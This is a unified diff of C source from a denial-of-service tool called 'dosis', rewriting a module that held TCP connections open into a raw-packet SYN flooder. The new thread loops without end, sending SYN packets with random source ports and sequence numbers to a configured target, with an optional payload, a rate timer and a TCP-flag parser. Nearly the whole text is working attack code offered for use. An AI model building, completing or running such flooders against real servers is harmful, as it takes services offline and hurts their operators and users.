@@ -1,7 +1,7 @@
 /*****************************************************************************
- * tcpopen.c
+ * tcpraw.c
  *
- * DoS on TCP servers by leaving connections opened.
+ * DoS on TCP servers by raw tcp packets (synflood?).
  *
  * ---------------------------------------------------------------------------
  * dosis - DoS: Internet Sodomizer
@@ -25,26 +25,32 @@
 
 #include <config.h>
 
-#include "dosis.h"
 #include "dosconfig.h"
-#include "tea.h"
-#include "tcpopen.h"
+#include "dosis.h"
+#include "ip.h"
 #include "lnet.h"
+#include "log.h"
 #include "payload.h"
 #include "pthreadex.h"
-#include "log.h"
-#include "ip.h"
+#include "tcpraw.h"
+#include "tea.h"
 
-#define BUFSIZE    2048
+typedef struct _tag_TCPRAW_CFG {
+  /* options */
+  INET_ADDR          shost;
+  INET_ADDR          dhost;
+  int                flags;
 
-typedef struct _tag_TCPOPEN_CFG {
-  INET_ADDR   shost;
-  INET_ADDR   dhost;
-  unsigned    npackets;
-  char       *payload;
-  unsigned    payload_size;
-  LN_CONTEXT *lnc;
-} TCPOPEN_CFG;
+  /* parameters */
+  unsigned           npackets;
+  double             hitratio;
+  char              *payload;
+  unsigned           payload_size;
+
+  /* other things */
+  pthreadex_timer_t  timer;
+  LN_CONTEXT        *lnc;
+} TCPRAW_CFG;
 
 #define ip_protocol(x) (((struct iphdr *) (x))->protocol)
 #define ip_header(x)   ((struct iphdr *)  (x))
@@ -55,9 +61,9 @@ typedef struct _tag_TCPOPEN_CFG {
  * THREAD IMPLEMENTATION
  *****************************************************************************/
 
-static int tcpopen__listen_check(THREAD_WORK *tw, char *msg, unsigned int size)
+static int tcpraw__listen_check(THREAD_WORK *tw, char *msg, unsigned int size)
 {
-  TCPOPEN_CFG *tc = (TCPOPEN_CFG *) tw->data;
+  TCPRAW_CFG *tc = (TCPRAW_CFG *) tw->data;
 
   /* check msg size and headers */
   if(size < sizeof(struct iphdr)
@@ -68,58 +74,40 @@ static int tcpopen__listen_check(THREAD_WORK *tw, char *msg, unsigned int size)
   /* check msg */
   return ip_header(msg)->saddr == tc->dhost.addr.in.addr
       && ntohs(tcp_header(msg)->source) == tc->dhost.port
-         ? -1 : 0;
+         ? -255 : 0;
 }
 
-static void tcpopen__listen(THREAD_WORK *tw)
+static void tcpraw__thread(THREAD_WORK *tw)
 {
-  TCPOPEN_CFG *tc = (TCPOPEN_CFG *) tw->data;
-  TEA_MSG *m;
+  TCPRAW_CFG *tc = (TCPRAW_CFG *) tw->data;
+  unsigned int seq = libnet_get_prand(LIBNET_PRu32);
+  int i;
 
-  /* listen the radio */
-DBG("EATING INPUT");
-  while((m = tea_mqueue_shift(tw->mqueue)) != NULL)
+  TDBG("Started sender thread");
+
+  /* ATTACK */
+  while(1)
   {
-    DBG("[%d] Received a spoofed connection packet.", tw->id);
-    DBG2("[%d] Dropped << %d - %d.%d.%d.%d:%d/%d (rst=%d) => [%08x/%08x] >>",
-            tw->id,
-            ip_protocol(m->b),
-            (ip_header(m->b)->saddr >>  0) & 0x00ff,
-            (ip_header(m->b)->saddr >>  8) & 0x00ff,
-            (ip_header(m->b)->saddr >> 16) & 0x00ff,
-            (ip_header(m->b)->saddr >> 24) & 0x00ff,
-            tcp_header(m->b)->dest, tc->dhost.port,
-            tcp_header(m->b)->rst,
-            ip_header(m->b)->saddr, tc->shost.addr.in.addr);
+    /* wait for work */
+    if(tc->hitratio > 0)
+      if(pthreadex_timer_wait(&(tc->timer)) < 0)
+        TERR("Error at pthreadex_timer_wait(): %s", strerror(errno));
 
-    /* in some special case (handshake) send kakitas */
-    if(tcp_header(m->b)->syn != 0
-    && tcp_header(m->b)->ack != 0)
+    /* build TCP packet with payload (if requested) */
+    TDBG("Sending %d packet(s)...", tc->npackets);
+    for(i = 0; i < tc->npackets; i++)
     {
-      /* send handshake and data TCP packet */
-      DBG("[%d]   - Request packet sending...", tw->id);
+      seq += libnet_get_prand(LIBNET_PRu16) & 0x00ff;
+#warning "Set flags"
+#warning "Set window"
       ln_send_tcp_packet(tc->lnc,
-                         &tc->shost.addr.in.inaddr, ntohs(tcp_header(m->b)->dest),
+                         &tc->shost.addr.in.inaddr, libnet_get_prand(LIBNET_PRu16),
                          &tc->dhost.addr.in.inaddr, tc->dhost.port,
-                         TH_ACK,
-                         ntohs(tcp_header(m->b)->window),
-                         ntohl(tcp_header(m->b)->ack_seq),
-                         ntohl(tcp_header(m->b)->seq) + 1,
-                         NULL, 0);
-      ln_send_tcp_packet(tc->lnc,
-                         &tc->shost.addr.in.inaddr, ntohs(tcp_header(m->b)->dest),
-                         &tc->dhost.addr.in.inaddr, tc->dhost.port,
-                         TH_ACK | TH_PUSH,
-                         ntohs(tcp_header(m->b)->window),
-                         ntohl(tcp_header(m->b)->ack_seq),
-                         ntohl(tcp_header(m->b)->seq) + 1,
+                         TH_SYN, 13337,
+                         seq, 0,
                          (char *) tc->payload, tc->payload_size);
     }
-
-    /* release msg buffer */
-    tea_msg_release(m);
   }
-DBG("NO MOAR INPUT");
 }
 
 /*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
@@ -129,32 +117,41 @@ DBG("NO MOAR INPUT");
  *   configuration and reconfigurations.
  *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/
 
-static int tcpopen__configure(THREAD_WORK *tw, SNODE *command)
+static int tcpraw__configure(THREAD_WORK *tw, SNODE *command)
 {
-  TCPOPEN_CFG *tc = (TCPOPEN_CFG *) tw->data;
+  TCPRAW_CFG *tc = (TCPRAW_CFG *) tw->data;
   SNODE *cn;
   char *s;
+  int i;
 
-  /* initialize specialized work thread data */
+  /* first initialization (specialized work thread data) */
   if(tc == NULL)
   {
-    if((tc = calloc(1, sizeof(TCPOPEN_CFG))) == NULL)
-      D_FAT("[%d] No memory for TCPOPEN_CFG.", tw->id);
+    if((tc = calloc(1, sizeof(TCPRAW_CFG))) == NULL)
+      D_FAT("[%02d] No memory for TCPRAW_CFG.", tw->id);
     tw->data = (void *) tc;
 
     /* initialize libnet */
-    DBG("[%d] Initializing libnet.", tw->id);
+    TDBG("Initializing libnet.");
     if((tc->lnc = calloc(1, sizeof(LN_CONTEXT))) == NULL)
-      D_FAT("[%d] No memory for LN_CONTEXT.", tw->id);
+      D_FAT("[%02d] No memory for LN_CONTEXT.", tw->id);
     ln_init_context(tc->lnc);
+
+    pthreadex_timer_init(&(tc->timer), 0.0);
   }
 
   /* read from SNODE command parameters */
-  if(command->command.thc.to != NULL)
-  if(command->command.thc.to->to.pattern != NULL)
-    FAT("%d: TCPOPEN does not accept a pattern.",
-        command->command.thc.to->to.pattern->line);
+  cn = command->command.thc.to->to.pattern;
+  if(cn->type != TYPE_PERIODIC)
+    TFAT("%d: Uknown pattern %d.", cn->line, cn->type);
   
+  tc->hitratio = tea_get_float(cn->pattern.periodic.ratio);
+  tc->npackets = tea_get_int(cn->pattern.periodic.n);
+  if(tc->hitratio < 0)
+    TFAT("%d: Bad hit ratio '%f'.", cn->line, tc->hitratio);
+  if(tc->npackets <= 0)
+    TFAT("%d: Bad number of packets '%d'.", cn->line, tc->npackets);
+
   /* read from SNODE command options */
   for(cn = command->command.thc.to->to.options; cn; cn = cn->option.next)
     switch(cn->type)
@@ -162,7 +159,7 @@ static int tcpopen__configure(THREAD_WORK *tw, SNODE *command)
       case TYPE_OPT_SRC:
         s = tea_get_string(cn->option.addr);
         if(ip_addr_parse(s, &tc->shost))
-          FAT("%d: Cannot parse source address '%s'.", cn->line, s);
+          TFAT("%d: Cannot parse source address '%s'.", cn->line, s);
         free(s);
         if(cn->option.port)
           ip_addr_set_port(&tc->shost, tea_get_int(cn->option.port));
@@ -171,10 +168,28 @@ static int tcpopen__configure(THREAD_WORK *tw, SNODE *command)
       case TYPE_OPT_DST:
         s = tea_get_string(cn->option.addr);
         if(ip_addr_parse(s, &tc->dhost))
-          FAT("%d: Cannot parse source address '%s'.", cn->line, s);
+          TFAT("%d: Cannot parse source address '%s'.", cn->line, s);
         free(s);
         if(cn->option.port)
           ip_addr_set_port(&tc->dhost, tea_get_int(cn->option.port));
+        break;
+
+      case TYPE_OPT_FLAGS:
+        s = tea_get_string(cn->option.flags);
+        tc->flags = 0;
+        for(i = 0; s[i]; i++)
+          switch(toupper(s[i]))
+          {
+            case 'U': tc->flags |= 0x20; break; /* urgent */
+            case 'A': tc->flags |= 0x10; break; /* ack    */
+            case 'P': tc->flags |= 0x08; break; /* push   */
+            case 'R': tc->flags |= 0x04; break; /* reset  */
+            case 'S': tc->flags |= 0x02; break; /* syn    */
+            case 'F': tc->flags |= 0x01; break; /* fin    */
+            default:
+              TFAT("%d: Unknown TCP flag '%c'.", cn->line, s[i]);
+          }
+        free(s);
         break;
 
       case TYPE_OPT_PAYLOAD_FILE:
@@ -184,12 +199,16 @@ static int tcpopen__configure(THREAD_WORK *tw, SNODE *command)
         break;
 
       default:
-        FAT("%d: Uknown option %d.", cn->line, cn->type);
+        TFAT("%d: Uknown option %d.", cn->line, cn->type);
     }
+
+  /* configure timer */
+  if(tc->hitratio > 0)
+    pthreadex_timer_set_frequency(&(tc->timer), tc->hitratio);
 
   /* configure src address (if not defined) */
   if(tc->dhost.type == INET_FAMILY_NONE)
-    FAT("I need a target address.");
+    TFAT("I need a target address.");
   if(tc->shost.type == INET_FAMILY_NONE)
   {
     DOS_ADDR_INFO *ai;
@@ -197,7 +216,7 @@ static int tcpopen__configure(THREAD_WORK *tw, SNODE *command)
     {
       char buff[255];
       ip_addr_snprintf(&tc->shost, sizeof(buff), buff);
-      WRN("Cannot find a suitable source address for '%s'.", buff);
+      TWRN("Cannot find a suitable source address for '%s'.", buff);
     } else
       ip_addr_copy(&tc->shost, &ai->addr);
   }
@@ -206,51 +225,48 @@ static int tcpopen__configure(THREAD_WORK *tw, SNODE *command)
   {
     char buff[255];
 
-    DBG2("[%d] config.periodic.bytes  = %d", tw->id, tc->payload_size);
+    TDBG2("config.periodic.n     = %d", tc->npackets);
+    TDBG2("config.periodic.ratio = %d", tc->hitratio);
 
     ip_addr_snprintf(&tc->shost, sizeof(buff)-1, buff);
-    DBG2("[%d] config.options.shost   = %s", tw->id, buff);
+    TDBG2("config.options.shost  = %s", buff);
     ip_addr_snprintf(&tc->dhost, sizeof(buff)-1, buff);
-    DBG2("[%d] config.options.dhost   = %s", tw->id, buff);
-    DBG2("[%d] config.options.payload = %d bytes", tw->id, tc->payload_size);
+    TDBG2("config.options.dhost  = %s", buff);
+    TDBG2("config.options.flags  = %x", tc->flags);
   }
 
   return 0;
 }
 
-static void tcpopen__cleanup(THREAD_WORK *tw)
+static void tcpraw__cleanup(THREAD_WORK *tw)
 {
-  TCPOPEN_CFG *tc = (TCPOPEN_CFG *) tw->data;
+  TCPRAW_CFG *tc = (TCPRAW_CFG *) tw->data;
 
-  if(tc)
+  /* collect libnet data */
+  ln_destroy_context(tc->lnc);
+  free(tc->lnc);
+  pthreadex_timer_destroy(&tc->timer);
+
+  if(tc->payload)
   {
-    /* collect libnet data */
-    if(tc->lnc)
-    {
-      ln_destroy_context(tc->lnc);
-      free(tc->lnc);
-      tc->lnc = NULL;
-    }
-    if(tc->payload)
-    {
-      free(tc->payload);
-      tc->payload = NULL;
-    }
-    free(tc);
-    tw->data = NULL;
+    free(tc->payload);
+    tc->payload = NULL;
   }
-  DBG("[%d] Finalized.", tw->id);
+  free(tc);
+  tw->data = NULL;
+
+  TDBG("Finalized.");
 }
 
 /*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
- * TEA OBJECT
+ * TCPRAW TEA OBJECT
  *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/
 
-TEA_OBJECT teaTCPOPEN = {
-  .name         = "TCPOPEN",
-  .configure    = tcpopen__configure,
-  .cleanup      = tcpopen__cleanup,
-  .listen       = tcpopen__listen,
-  .listen_check = tcpopen__listen_check,
+TEA_OBJECT teaTCPRAW = {
+  .name         = "TCPRAW",
+  .configure    = tcpraw__configure,
+  .cleanup      = tcpraw__cleanup,
+  .listen_check = tcpraw__listen_check,
+  .thread       = tcpraw__thread,
 };
 
